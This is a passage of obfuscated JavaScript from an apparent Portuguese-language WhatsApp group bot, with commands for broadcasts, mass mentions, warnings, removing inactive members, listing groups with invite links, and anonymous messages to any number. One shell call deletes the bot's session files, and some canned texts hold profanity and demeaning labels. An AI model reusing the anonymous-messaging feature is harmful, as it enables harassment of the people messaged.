              var _0x1fea19 = _0x434b84 ? _0x50e057?.documentWithCaptionMessage?.message?.documentMessage : _0x302296.message?.documentWithCaptionMessage?.message?.documentMessage;
              var _0x31ef53 = _0x6aebb1 ? _0x50e057.audioMessage : "";
              var _0x119425 = _0x1785a1 ? _0x50e057.stickerMessage : "";
              var _0xe8e243 = _0x368a3f && !_0x31ef53 && !_0x119425 && !_0x4d7bf7 && !_0x5185f1 && !_0x371248 && !_0x1fea19 ? "Transmissão Do Dono: " + _0x50e057.conversation : _0x302296.message?.conversation;
              var _0x56d93d = _0x57848 && !_0x31ef53 && !_0x119425 && !_0xe8e243 && !_0x4d7bf7 && !_0x5185f1 && !_0x371248 && !_0x1fea19 ? "Transmissão Do Dono: " + _0x50e057.extendedTextMessage?.text : _0x302296?.message?.extendedTextMessage?.text;
              if (_0x4d7bf7) {
                var _0x1dc02e = _0x4d7bf7;
                _0x4d7bf7.caption = _0x1d6557.length > 1 ? "Transmissão Do Dono: " + _0x1d6557 : _0x4d7bf7.caption.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                _0x4d7bf7.image = {
                  url: _0x4d7bf7.url
                };
              } else if (_0x5185f1) {
                var _0x1dc02e = _0x5185f1;
                _0x5185f1.caption = _0x1d6557.length > 1 ? "Transmissão Do Dono: " + _0x1d6557 : _0x5185f1.caption.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                _0x5185f1.video = {
                  url: _0x5185f1.url
                };
              } else if (_0xe8e243) {
                black = {};
                black.text = _0xe8e243.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                var _0x1dc02e = black;
              } else if (!_0x31ef53 && !_0x119425 && _0x56d93d) {
                brown = {};
                brown.text = _0x56d93d.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                var _0x1dc02e = brown;
              } else if (_0x371248) {
                var _0x1dc02e = _0x371248;
                _0x371248.document = {
                  url: _0x371248.url
                };
              } else if (_0x1fea19) {
                var _0x1dc02e = _0x1fea19;
                _0x1fea19.caption = _0x1d6557.length > 1 ? "Transmissão Do Dono: " + _0x1d6557 : _0x1fea19.caption.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                _0x1fea19.document = {
                  url: _0x1fea19.url
                };
              } else if (_0x119425) {
                var _0x1dc02e = _0x119425;
                _0x119425.sticker = {
                  url: _0x119425.url
                };
              } else if (_0x31ef53) {
                var _0x1dc02e = _0x31ef53;
                _0x31ef53.audio = {
                  url: _0x31ef53.url
                };
              }
              for (_0xc3d45a = 0; _0xc3d45a < _0x26cfcd.length; _0xc3d45a++) {
                _0x263319.sendMessage(_0x26cfcd[_0xc3d45a].id, _0x1dc02e);
              }
              break;
            case "grupo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x40e45c[0] === "a") {
                _0x403602("*GRUPO ABERTO COM SUCESSO*");
                _0x263319.groupSettingUpdate(_0x4f1071, "not_announcement");
              } else if (_0x40e45c[0] === "f") {
                _0x403602("*GRUPO FECHADO COM SUCESSO*");
                _0x263319.groupSettingUpdate(_0x4f1071, "announcement");
                if (botoes) {
                  await sleep(1500);
                  _0x263319.relayMessage(_0x4f1071, {
                    interactiveMessage: {
                      body: {
                        text: "𝘿𝙀𝙎𝙀𝙅𝘼 𝘼𝘽𝙍𝙄𝙍 𝙊 𝙂𝙍𝙐𝙋𝙊 ?"
                      },
                      footer: {
                        text: ""
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "quick_reply",
                          buttonParamsJson: JSON.stringify({
                            display_text: "⟨ Sim ⟩",
                            id: _0x1d93be + "grupo a",
                            quick_reply: "Sim, Grupo A"
                          })
                        }]
                      }
                    }
                  }, {});
                } else {}
              }
              break;
            case "grupoinfo":
            case "infogrupo":
            case "infogp":
            case "gpinfo":
            case "regras":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              try {
                var _0x5c911f = await _0x263319.profilePictureUrl(_0x4f1071, "image");
              } catch {
                var _0x5c911f = "https://telegra.ph/file/6ca032835ed7a16748b6f.jpg";
              }
              const _0x405073 = {
                url: _0x5c911f
              };
              const _0x5bc906 = {
                image: _0x405073,
                caption: "*NOME* : " + _0x471350 + "\n*MEMBRO* : " + _0x5b3ba6.length + "\n*ADMIN* : " + _0x2aa963.length + "\n*DESCRIÇÃO* : " + _0x359fc4,
                thumbnail: null
              };
              const _0x43e5e9 = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x5bc906, _0x43e5e9);
              break;
            case "totag":
            case "cita":
            case "hidetag":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e && !_0x2a5ff3) {
                return _0x403602(_0x5c594c);
              }
              var _0x1dc02e = "";
              var _0x50e057 = _0x302296.message?.extendedTextMessage?.contextInfo?.quotedMessage;
              var _0x4d7bf7 = _0x10f925 ? _0x50e057?.imageMessage : _0x302296.message?.imageMessage;
              var _0x5185f1 = _0x5760e9 ? _0x50e057?.videoMessage : _0x302296.message?.videoMessage;
              var _0x371248 = _0x11898e ? _0x50e057?.documentMessage : _0x302296.message?.documentMessage;
              var _0x1fea19 = _0x434b84 ? _0x50e057?.documentWithCaptionMessage?.message?.documentMessage : _0x302296.message?.documentWithCaptionMessage?.message?.documentMessage;
              var _0x31ef53 = _0x6aebb1 ? _0x50e057.audioMessage : "";
              var _0x119425 = _0x1785a1 ? _0x50e057.stickerMessage : "";
              var _0xe8e243 = _0x368a3f && !_0x31ef53 && !_0x119425 && !_0x4d7bf7 && !_0x5185f1 && !_0x371248 && !_0x1fea19 ? _0x50e057.conversation : _0x302296.message?.conversation;
              var _0x56d93d = _0x50e057?.extendedTextMessage?.text || _0x302296?.message?.extendedTextMessage?.text;
              var _0x10d142 = _0x5b3ba6.map(_0x2de484 => _0x2de484.id);
              if (_0x4d7bf7 && !_0x31ef53 && !_0x371248) {
                var _0x1dc02e = _0x4d7bf7;
                _0x4d7bf7.caption = _0x1d6557.length > 1 ? "Marcação Do Adm: " + _0x1d6557 : _0x4d7bf7.caption.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "Marcação do Adm: " + _0x55a6ac + "\n\n");
                _0x4d7bf7.image = {
                  url: _0x4d7bf7.url
                };
                _0x4d7bf7.mentions = _0x10d142;
              } else if (_0x5185f1 && !_0x31ef53 && !_0x371248) {
                var _0x1dc02e = _0x5185f1;
                _0x5185f1.caption = _0x1d6557.length > 1 ? "Marcação Do Adm: " + _0x1d6557.trim() : _0x5185f1.caption.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "Marcação do Adm: " + _0x55a6ac + "\n\n").trim();
                _0x5185f1.video = {
                  url: _0x5185f1.url
                };
                _0x5185f1.mentions = _0x10d142;
              } else if (_0xe8e243 && !_0x31ef53 && !_0x371248) {
                black = {};
                black.text = _0xe8e243.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "Marcação do Adm: " + _0x55a6ac + "\n\n").trim();
                black.mentions = _0x10d142;
                var _0x1dc02e = black;
              } else if (!_0x31ef53 && !_0x119425 && _0x56d93d && !_0x371248 && !_0x371248) {
                brown = {};
                brown.text = _0x56d93d.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "Marcação do Adm: " + _0x55a6ac + "\n\n").trim();
                brown.mentions = _0x10d142;
                var _0x1dc02e = brown;
              } else if (_0x371248) {
                var _0x1dc02e = _0x371248;
                _0x371248.document = {
                  url: _0x371248.url
                };
                _0x371248.mentions = _0x10d142;
              } else if (_0x1fea19 && !_0x31ef53) {
                var _0x1dc02e = _0x1fea19;
                _0x1fea19.caption = _0x1d6557.length > 1 ? "Marcação Do Adm: " + _0x1d6557.trim() : _0x1fea19.caption.replace(new RegExp(_0x1d93be + _0x3dec88, "gi"), "Marcação do Adm: " + _0x55a6ac + "\n\n").trim();
                _0x1fea19.document = {
                  url: _0x1fea19.url
                };
                _0x1fea19.mentions = _0x10d142;
              } else if (_0x119425 && !_0x31ef53) {
                var _0x1dc02e = _0x119425;
                _0x119425.sticker = {
                  url: _0x119425.url
                };
                _0x119425.mentions = _0x10d142;
              } else if (_0x31ef53) {
                var _0x1dc02e = _0x31ef53;
                _0x31ef53.audio = {
                  url: _0x31ef53.url
                };
                _0x31ef53.mentions = _0x10d142;
                _0x31ef53.ptt = true;
              }
              _0x263319.sendMessage(_0x4f1071, _0x1dc02e).catch(_0x49d71b => {
                console.log(_0x49d71b);
              });
              break;
            case "marcar":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              async function _0x4f52b8() {
                bla = [];
                blad = "\n𝑀𝐸𝑀𝐵𝑅𝑂𝑆 𝐶𝑂𝑀𝑈𝑀\n𝐵𝑂𝑇: " + NomeDoBot + "\n\n-_- Do Grupo: " + _0x471350 + " -_-" + (!_0x1d6557 ? "" : "\n\n~» Mensagem: " + _0x1d6557) + "\n\n";
                for (let _0x280fe7 of _0x1bed8b) {
                  blad += "✥➤ @" + _0x280fe7.split("@")[0] + "\n\n";
                  bla.push(_0x280fe7);
                }
                blam = JSON.stringify(_0x1bed8b);
                if (blam.length == 2) {
                  return _0x403602("Olá Adm - Não contêm Membros comum no Grupo: " + _0x471350 + ", apenas - [ ADMINISTRADORES ]");
                }
                _0xd7aa55(blad, bla, true);
              }
              _0x4f52b8().catch(_0x51f085 => {
                console.log(_0x51f085);
              });
              break;
            case "marcar2":
              try {
                if (!_0xd20756) {
                  return _0x403602(_0x270bdf);
                }
                if (!_0x150e9e && !_0x35021e) {
                  return _0x403602(_0x5c594c);
                }
                if (_0x1d6557.includes("" + _0x1d93be)) {
                  return _0x403602("Não pode utilizar comandos nesse comando");
                }
                members_id = [];
                teks = _0x40e45c.length > 1 ? _0x2e320b.slice(8).trim() : "";
                teks += "\n\n";
                for (let _0x24dd9e of _0x5b3ba6) {
                  teks += "╠➥ @" + _0x24dd9e.id.split("@")[0] + "\n";
                  members_id.push(_0x24dd9e.id);
                }
                _0x403602(teks);
              } catch {
                _0x403602("ERROR!!");
              }
              break;
            case "marcarwa":
              try {
                if (!_0xd20756) {
                  return _0x403602(_0x270bdf);
                }
                if (!_0x150e9e && !_0x35021e) {
                  return _0x403602(_0x5c594c);
                }
                if (_0x1d6557.includes("" + _0x1d93be)) {
                  return _0x403602("Não pode utilizar comandos nesse comando");
                }
                members_id = [];
                teks = _0x40e45c.length > 1 ? _0x2e320b.slice(10).trim() : "";
                teks += "\n\n";
                for (let _0x3e0356 of _0x5b3ba6) {
                  teks += "╠➥ https://wa.me/" + _0x3e0356.id.split("@")[0] + "\n";
                  members_id.push(_0x3e0356.id);
                }
                const _0x4fd859 = {
                  text: teks
                };
                const _0x3a1da3 = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, _0x4fd859, _0x3a1da3);
              } catch {
                _0x403602("ERROR!!");
              }
              break;
            case "reviverqr":
              if (!_0x2a5ff3 && !_0x35021e) {
                return;
              }
              exec("cd DADOS/XBOT-QR && rm -rf pre-key* sender* session*");
              setTimeout(async () => {
                _0x403602("Reiniciando..");
                setTimeout(async () => {
                  process.exit();
                }, 1200);
              }, 1000);
              break;
            case "reviver":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x2a5ff3) {
                return _0x403602("Comando Desativado pelo dono...");
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0x5550bd) {
                return _0x403602(_0x4c16a9);
              }
              if (_0x302296.message.extendedTextMessage === undefined || _0x302296.message.extendedTextMessage === null) {
                return _0x403602("Marque uma mensagem do alvo!");
              }
              sleep(5000);
              response2 = await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x5d6558], "add");
              _0x403602("Usuario Adicionado de volta ao grupo.");
              break;
            case "sairgp":
              if (_0xd20756 && !_0x2a5ff3) {
                return _0x403602("Este comando só o bot ou o dono pode executar..");
              }
              try {
                _0x263319.groupLeave(_0x4f1071);
              } catch (_0x3339da) {
                _0x403602(String(_0x3339da));
              }
              break;
            case "seradm":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602("Só dono pode executar este comando.");
              }
              _0xd7aa55("@" + _0x32e455.split("@")[0] + " Pronto - Agora você é um administrador..", [_0x32e455], true);
              _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "promote");
              break;
            case "sermembro":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602("Só dono pode executar este comando.");
              }
              _0xd7aa55("@" + _0x32e455.split("@")[0] + " Pronto - Agora você é um membro comum novamente..", [_0x32e455], true);
              _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "demote");
              break;
            case "advertir":
            case "ocorrencia":
            case "adverter":
            case "punir":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x1dcf0a == _0x2dd81a) {
                return _0x403602("Não pode advertir o próprio bot...");
              }
              if (_0x1dcf0a == _0x3a52d1) {
                return _0x403602("Não pode advertir o próprio dono do bot");
              }
              if (_0x2aa963.includes(_0x1dcf0a)) {
                return _0x403602("Não pode advertir ADMS..");
              }
              if (!JSON.stringify(_0x5b3ba6).includes(_0x1dcf0a)) {
                return _0x403602("Não tem como advertir um usuário que não se encontra mais no grupo..");
              }
              _0x31fb03.push(_0x1dcf0a);
              _0x33e29e(_0x3bd584);
              setTimeout(async () => {
                var _0x5a84b4 = _0x31fb03.filter(_0x3dc035 => _0x3dc035 == _0x1dcf0a).length;
                var _0x4a53b9 = "Opa: @" + _0x1dcf0a.split("@")[0] + " você foi advertido " + _0x5a84b4 + "/3, tome cuidado, com 3 advertências, você será removido...";
                if (!_0x4a53b9.includes("3/3")) {
                  if (!JSON.stringify(_0x31fb03).includes(_0x32e455)) {
                    await sleep(1500);
                    _0xd7aa55(_0x4a53b9, [_0x1dcf0a]);
                  } else if (_0x5a84b4 == 2) {
                    await sleep(1500);
                    _0xd7aa55(_0x4a53b9, [_0x1dcf0a]);
                  }
                } else {
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "Adeus usuário @" + _0x1dcf0a.split("@")[0] + ", você completou 3 advertências 😪, fale com quem a baniu para ter noção de o que ocorreu..",
                    mentions: [_0x1dcf0a]
                  });
                  await sleep(1500);
                  _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x1dcf0a], "remove");
                  var _0x4389d3 = _0x31fb03.indexOf(_0x1dcf0a);
                  _0x31fb03.splice(_0x4389d3, 3);
                  _0x33e29e(_0x3bd584);
                }
              }, 3000);
              break;
            case "deladvertir":
            case "deladvertencia":
            case "deladvertências":
            case "deladvertencias":
            case "deladverter":
            case "delpunir":
            case "delpunicao":
            case "delpunição":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x1dcf0a == _0x2dd81a) {
                return _0x403602("Não é possível remover advertências do próprio bot...");
              }
              if (_0x1dcf0a == _0x3a52d1) {
                return _0x403602("Não é possível remover advertências do próprio dono do bot");
              }
              if (!JSON.stringify(_0x5b3ba6).includes(_0x1dcf0a)) {
                return _0x403602("Não é possível remover advertências de um usuário que não está mais no grupo..");
              }
              var _0x397946 = _0x31fb03.indexOf(_0x1dcf0a);
              if (_0x397946 !== -1) {
                _0x31fb03.splice(_0x397946, 1);
                _0x33e29e(_0x3bd584);
                _0x403602("As advertências de @" + _0x1dcf0a.split("@")[0] + " foram removidas.");
              } else {
                _0x403602("@" + _0x1dcf0a.split("@")[0] + " não possui advertências.");
              }
              break;
            case "apresentar":
            case "apr":
              inff = "Bem vindo(a) ao grupo : " + _0x471350 + "\n\n\n👾 •𝑬𝑵𝑻𝑹𝑶𝑼 𝑺𝑬 𝑨𝑷𝑹𝑬𝑺𝑬𝑵𝑻𝑨•\n📸 •F𝜣T𝜣\n👻 •N𝜣ME\n📌 •CID∆DE\n🗓️ •ID∆DE\n⚠️ •LEI∆ ∆S REGR∆S D𝜣 GRUP𝜣\n\n*APROVEITE O GRUPO!*";
              const _0x2a6642 = {
                text: inff
              };
              const _0x24fdc4 = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x2a6642, _0x24fdc4);
              break;
            case "papof":
            case "regraspp":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              txtz = "【᯽𒋨📷:𝑆𝑒 𝑎𝑝𝑟𝑒𝑠𝑒𝑛𝑡𝑒𝑚 𝑙𝑖𝑥𝑜𝑠🌚»°】\n𒋨·࣭࣪̇🔥ɴᴏᴍᴇ:\n𒋨·࣭࣪̇🔥ɪᴅᴀᴅᴇ:\n𒋨·࣭࣪̇🔥ʀᴀʙᴀ:\n*Aᴘʀᴇsᴇɴᴛᴇ-sᴇ sᴇ ǫᴜɪsᴇʀ.*\n𝙏𝘼𝙂𝙎➭᜔ׂ࠭ ⁸₈⁸|𝟖𝟖𝟖|𝟠𝟠𝟠| ེི⁸⁸⁸\n ──╌╌╌┈⊰★⊱┈╌╌╌┈─\n❌ ENTROU NO \nGRUPO INTERAJA, NÃO PRECISAMOS DE ENFEITES,INATIVOS SERAO REMOVIDOS ❌* \n\n/﹋<,︻╦╤─ ҉ - -----💥 \n/﹋ 🅴 🅱🅴🅼 🆅🅸🅽🅳🅾 🆂🅴🆄🆂 🅵🅸🅻🅷🅾🆂 🅳🅰 🅿🆄🆃🅰";
              const _0x208796 = {
                text: txtz
              };
              const _0x2509fe = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x208796, _0x2509fe);
              break;
            case "digt":
              bla = "🔥↯𝐉𝐀 𝐄𝐍𝐓𝐑𝐀 𝐃𝐈𝐆𝐈𝐓𝐀𝐍𝐃𝐎 𝚽𝐈 ↯°🌚💕\n           ི⋮ ྀ🌴⏝ ི⋮ ྀ🚸 ི⋮ ྀ⏝🌴 ི⋮ ྀ \n\n🐼🍧↯𝖠𝖰𝖴𝖨 𝖵𝖮𝖢𝖤̂ 𝖯𝖮𝖣𝖤 𝖲𝖤𝖱↯🍧🐻\nㅤㅤㅤㅤ  ◍۫❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ⟅◌ٜ🛸◌⟆࣭࣭ٜ໑⃕ꔷ⃘࣭࣭࣭࣭ٜ❀۫◍ི࣭࣭࣭࣭ ུ\n    【✔】ᴘʀᴇᴛᴀ👩🏾‍🦱 【✔】ʙʀᴀɴᴄᴀ👩🏼\n    【✔】ᴍᴀɢʀᴀ🍧【✔】ɢᴏʀᴅᴀ🍿\n    【✔】ᴘᴏʙʀᴇ🪙 【✔】ʀɪᴄᴀ💳\n    【✔】ʙᴀɪᴀɴᴀ💌【✔】ᴍᴀᴄᴏɴʜᴇɪʀᴀ🍁\n    【✔】ᴏᴛᴀᴋᴜ🧧【✔】ᴇ-ɢɪʀʟ🦄\n    【✔】ʟᴏʟɪ🍭    【✔】ɢᴀᴅᴏ🐃\n    【✔】ɢᴀʏ🏳️‍🌈     【✔】ʟᴇsʙɪᴄᴀ✂️\n    【✔】ᴠᴀᴅɪᴀ💄  【✔】ᴛʀᴀᴠᴇᴄᴏ🍌\n                【✔】ɴɪɴɢᴜᴇᴍ ʟɪɢᴀ📵\n. ☪︎ • ☁︎. . •.\n【 𝐕𝐄𝐌 𝐆𝐀𝐋𝐄𝐑𝐀, 𝐒𝐄 𝐃𝐈𝐕𝐄𝐑𝐓𝐈𝐑 𝐄 𝐅𝐀𝐙𝐄𝐑 𝐏𝐀𝐑𝐓𝐄 𝐃𝐀 𝐅𝐀𝐌𝐈𝐋𝐈𝐀.】🥂";
              const _0x38afe3 = {
                text: bla
              };
              const _0x23bf8a = {
                quoted: _0xa6b34
              };
              _0x263319.sendMessage(_0x4f1071, _0x38afe3, _0x23bf8a);
              break;
            case "sairdogp":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557) {
                return _0x403602("Você deve visualizar o comando " + _0x1d93be + "listagp e olhar de qual o grupo quer sair, e veja a numeração dele, e só digitar\nExemplo: " + _0x1d93be + "sairdogp 0\nesse comando é para o bot sair do grupo que deseja..");
              }
              var _0x2b89ea = await _0x263319.groupFetchAllParticipating();
              var _0xe96608 = Object.entries(_0x2b89ea).slice(0).map(_0x3001d9 => _0x3001d9[1]);
              var _0x422420 = _0xe96608.map(_0x744f6f => _0x744f6f);
              try {
                _0x263319.sendMessage(_0x422420[_0x1d6557].id, {
                  text: "Irei sair do grupo, por ordem do meu dono, adeus..."
                });
                setTimeout(() => {
                  _0x263319.groupLeave(_0x422420[_0x1d6557].id);
                }, 5000);
              } catch (_0x4b3eb4) {
                _0x403602(String(_0x4b3eb4));
              }
              _0x403602("Pronto meu dono, sair do grupo que você queria, em caso de dúvidas acione o comando listagp pra verificar..");
              break;
            case "listagp":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602("```SOMENTE MEU DONO LINDÃO```");
              }
              var _0x2b89ea = await _0x263319.groupFetchAllParticipating();
              var _0xe96608 = Object.entries(_0x2b89ea).slice(0).map(_0x447909 => _0x447909[1]);
              var _0x422420 = _0xe96608.map(_0xf61e48 => _0xf61e48);
              _0x422420.sort((_0x4cbc07, _0x85c5a0) => _0x4cbc07[0] < _0x85c5a0.length);
              teks1 = "*LISTA DE GRUPOS*\n*Total de Grupos* : " + _0x422420.length + "\n\n";
              for (let _0x417e47 = 0; _0x417e47 < _0x422420.length; _0x417e47++) {
                var _0x1b8c26 = await _0x263319.groupMetadata(_0x422420[_0x417e47].id);
                try {
                  var _0xc95cec = await _0x263319.groupInviteCode(_0x422420[_0x417e47].id);
                } catch {
                  var _0xc95cec = "Não foi possivel puxar o link";
                }
                teks1 += "• *Grupo* : " + _0x417e47 + "\n• *Nome do Grupo* : " + _0x422420[_0x417e47].subject + "\n• *Id do Grupo* : " + _0x422420[_0x417e47].id + "\n• Link do grupo: https://chat.whatsapp.com/" + _0xc95cec + "\n• *Dono_Ofc*: " + _0x1b8c26.subjectOwner + "\n• *Criado* : " + moment(("" + _0x422420[_0x417e47].creation) * 1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss") + "\n• *Total de Membros* : " + _0x422420[_0x417e47].participants.length + "\n\n";
              }
              _0x403602(teks1);
              break;
            case "atividade":
            case "atividades":
              try {
                if (!_0x150e9e && !_0x35021e && !_0x335a29 && !_0x594818) {
                  return _0x403602(_0x5c594c);
                }
                if (_0xd20756 && JSON.stringify(countMessage).includes(_0x4f1071)) {
                  var _0x209e1e = countMessage.map(_0x4b8210 => _0x4b8210.groupId).indexOf(_0x4f1071);
                  if (countMessage[_0x209e1e].numbers.length == 0) {
                    return;
                  }
                  teks = "*Atividade dos membros do grupo:*\n\n";
                  for (_0xc3d45a = 0; _0xc3d45a < countMessage[_0x209e1e].numbers.length; _0xc3d45a++) {
                    var _0x4893dc = countMessage[_0x209e1e].numbers.map(_0x2741e0 => _0x2741e0.id).indexOf(countMessage[_0x209e1e].numbers[_0xc3d45a].id);
                    var _0x597f9e = countMessage[_0x209e1e].numbers[_0xc3d45a];
                    teks += "*• Membro:* @" + _0x597f9e.id.split("@")[0] + "\n*• Comandos:* " + _0x597f9e.cmd_messages + "*\n*• Mensagens:* " + _0x597f9e.messages + "*\n*• Aparelho:* " + _0x597f9e.aparelho + "*\n\n----------------------------------\n\n";
                  }
                  _0x5b6fe5(teks);
                } else {
                  return _0x403602("*Nada foi encontrado*");
                }
              } catch (_0x439c6d) {
                console.log(_0x439c6d);
              }
              break;
            case "inativos":
            case "inativo":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (_0x1d6557.match(/[a-z]/i) || !_0x1d6557) {
                return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " 0\nIsso mostrará quantas pessoas tem 0 mensagens no grupo, e se usar 5, vai mostrar quantos usuários tem 5 mensagens ou menos..");
              }
              var _0x280f32 = countMessage?.map(_0x1c85ed => _0x1c85ed.groupId)?.indexOf(_0x4f1071);
              _0x5185f1 = [];
              for (_0xc3d45a of countMessage[_0x280f32].numbers) {
                if (_0xc3d45a.messages <= _0x1d6557.trim()) {
                  if (_0xc3d45a.figus <= _0x1d6557.trim()) {
                    if (_0xc3d45a.cmd_messages <= _0x1d6557.trim()) {
                      if (!_0x2aa963.includes(_0xc3d45a.id)) {
                        if (!_0x27033e.includes(_0xc3d45a.id)) {
                          if (_0xc3d45a.id != _0x2dd81a) {
                            if (_0x5b3ba6.map(_0x2b8c99 => _0x2b8c99.id).includes(_0xc3d45a.id)) {
                              _0x5185f1.push(_0xc3d45a.id);
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
              ;
              for (_0xc3d45a of countMessage[_0x280f32].numbers) {
                if (!_0x5b3ba6.map(_0x5debb5 => _0x5debb5.id).includes(_0xc3d45a.id)) {
                  if (_0xc3d45a.id.length > 5) {
                    _0x5185f1.push(_0xc3d45a.id);
                  }
                }
              }
              if (_0x5185f1.length == 0) {
                return _0x403602("Não tem pessoas com " + _0x1d6557 + "  mensagens..");
              }
              bli = "Usuários com " + _0x1d6557.trim() + " mensagem(ns) pra baixo..\n\n";
              for (ac = 0; ac < _0x5185f1.length; ac++) {
                bli += ac + 1 + " - _ Usuário: @" + _0x5185f1[ac].split("@")[0] + "\n\n";
              }
              _0x5b6fe5(bli);
              break;
            case "banghost":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (_0x1d6557.match(/[a-z]/i) || !_0x1d6557 || _0x1d6557.length > 3) {
                return _0x403602("Digite a partir de quantas mensagens pra baixo você deseja remover (que não interaje no grupo).\nExemplo: " + (_0x1d93be + _0x3dec88) + " 0");
              }
              var _0x280f32 = countMessage?.map(_0x3badcd => _0x3badcd.groupId)?.indexOf(_0x4f1071);
              _0x5185f1 = [];
              for (_0xc3d45a of countMessage[_0x280f32].numbers) {
                if (_0xc3d45a.messages <= Number(_0x1d6557.trim())) {
                  if (_0xc3d45a.figus <= Number(_0x1d6557.trim())) {
                    if (_0xc3d45a.cmd_messages <= Number(_0x1d6557.trim())) {
                      if (!_0x2aa963.includes(_0xc3d45a.id)) {
                        if (!_0x27033e.includes(_0xc3d45a.id)) {
                          if (_0xc3d45a.id != _0x2dd81a) {
                            if (_0x5b3ba6.map(_0xdf4f47 => _0xdf4f47.id).includes(_0xc3d45a.id)) {
                              _0x5185f1.push(_0xc3d45a.id);
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
              ;
              for (_0xc3d45a of countMessage[_0x280f32].numbers) {
                if (!_0x5b3ba6.map(_0x4a04b2 => _0x4a04b2.id).includes(_0xc3d45a.id)) {
                  if (_0xc3d45a.id.length > 5) {
                    _0x5185f1.push(_0xc3d45a.id);
                  }
                }
              }
              if (_0x5185f1.length == 0) {
                return _0x403602("Não tem mais pessoas com " + _0x1d6557.trim() + " mensagem(ns) para eu remover..");
              }
              for (_0xc3d45a = 0; _0xc3d45a < _0x5185f1.length; _0xc3d45a++) {
                await sleep(1000);
                _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x5185f1[_0xc3d45a]], "remove");
              }
              break;
            case "correio":
              txt = _0x2e320b.slice(10);
              txtt = _0x40e45c.join(" ");
              _0x3a7079 = txt.split("/")[0];
              _0x137400 = txtt.split("/")[1];
              if (!txt) {
                return _0x403602("Cade o número da pessoa?");
              }
              if (!txtt) {
                return _0x403602("Cade a mensagem do correio??");
              }
              if (txt.includes("-")) {
                return _0x403602("Tem que ser o número junto sem +, e não pode tá separado da /");
              }
              if (txtt.includes("+")) {
                return _0x403602("Tem que ser o número junto sem +, e não pode tá separado da /");
              }
              if (!txtt.includes("/")) {
                return _0x403602("Exemplo: " + _0x1d93be + "correio 558198923680/Oi Amor, sdds");
              }
              bla = "╭┄━┄━┄━┄━┄━╮\n┞┧\xA0⸙. ͎۪۫\xA0\xA0\xA0\xA0\xA0\xA0\xA0\xA0\xA0\xA0💌\xA0\xA0ː͡₊ꞋꞌꞋꞌ\n┞┧Correio anônimo. \n┞┧Msg: " + _0x137400 + "\n┞┧\n╰┄━┄━┄━┄━┄━╮";
              const _0x51fdfa = {
                text: bla
              };
              _0x263319.sendMessage(_0x3a7079 + "@s.whatsapp.net", _0x51fdfa);
              break;
            case "nome-bot":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              NomeDoBot = _0x1d6557.trim();
              setting.NomeDoBot = _0x1d6557.trim();
              fs.writeFileSync("./DADOS/Dono/settings.json", JSON.stringify(setting, null, 2));
              _0x403602("O nome do seu bot foi alterado com sucesso para : " + _0x1d6557);
              break;
            case "nick-dono":
              if (!_0x2a5ff3 && !_0x35021e) {
                return _0x403602(_0x7e2f25);
              }
              setting.NickDono = _0x1d6557.trim();
              NickDono = setting.NickDono;
